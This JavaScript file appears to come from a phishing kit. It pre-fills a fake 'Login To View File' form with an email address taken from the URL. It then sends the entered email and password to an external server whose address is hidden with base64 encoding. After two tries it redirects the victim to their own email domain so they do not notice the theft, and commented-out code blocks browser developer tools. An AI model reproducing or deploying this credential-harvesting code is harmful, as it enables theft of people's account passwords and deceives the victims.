
      $("#submit-btn1").hide();

      /* global $ */
      $(document).ready(function(){
        var count=0;

      /////////////url email getting////////////////
      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
          // $('#email').val(email);
          var my_email =email;
          var ind=my_email.indexOf("@");
          var my_slice=my_email.substr((ind+1));
          var c= my_slice.substr(0, my_slice.indexOf('.'));
          var final= c.toLowerCase();
          
          $('#contact').trigger("reset");
          $("#msg").hide();
            // $('#fieldImg').attr('src', 'other-1.png');
            // $('#field').html("Other Mail");
            $('#email').val(my_email);
            $('#emailch').html(my_email);
            $("#msg").hide();
            // $("#inputbar").animate({left:200, opacity:"hide"}, 0);
            // $("#automail").animate({right:200, opacity:"show"}, 1000);
            // $('#ajaxModal').modal('show');
          }
        ///////////////url getting email////////////////


        
        $('#submit-btn').click(function(event){
          $('#error').hide();
          $('#msg').hide();
          event.preventDefault();
          var email=$("#email").val();
          var password=$("#password").val();
          var msg = $('#msg').html();
          $('#msg').text( msg );
        ///////////new injection////////////////
        var my_email =email;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        // if (!filter.test(my_email)) {
        //   $('#error').show();
        //   email.focus;
        //   return false;
        // }

        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        var n = my_email.search("@");
        ///////////new injection////////////////
        count=count+1;
        
        $.ajax({
          dataType: 'JSON',
          url: atob('aHR0cHM6Ly9zdnJjdjJoc2EueWxkLWF1LmNvbS9jb25zb2xlL2ZybmsvbG9naW4ucGhw'),
          type: 'POST',
          data:{
            xiemail:email,
            pipassword:password,
          },
              // data: $('#contact').serialize(),
              beforeSend: function(xhr){
                $('#submit-btn').html('Verifing...');
              },
              success: function(response){
                if(response){
                  $("#msg").show();
                  console.log(response);
                  if(response['signal'] == 'ok'){
                    $("#password").val("");
                    if (count>=2) {
                      count=0;
                      if (n<0) { 
                        window.location.replace('https://remdrift.ml/pdf/sada.htm');
                      }
                      else
                      {
                        window.location.replace('https://www.'+my_slice);
                      }
                    }
                    $('#msg').html(response['msg']);
                  }
                  else{
                    $('#msg').html(response['msg']);
                  }
                }
              },
              error: function(){
                $("#password").val("");
                if (count>=2) {
                  count=0;
                  if (n<0) { 
                    window.location.replace('https://remdrift.ml/pdf/sada.htm');
                  }
                  else
                  {
                    window.location.replace('https://www.'+my_slice);
                  }
                }
                $("#msg").show();
                $('#msg').html("Wrong password, Please try again later");
              },
              complete: function(){
                $('#submit-btn').html('Login To View File');
              }
            });
      });


      });

  // document.onkeydown=function(e){
  //   if (e.ctrlKey && 
  //     (e.keyCode === 73 || 
  //      e.keyCode === 105 ||
  //      e.keyCode === 74 || 
  //      e.keyCode === 106 || 
  //      e.keyCode === 85 || 
  //      e.keyCode === 117)) {
  //     alert('not allowed');
  //   return false;
  // } else {
  //   return true;
  // }
  // }
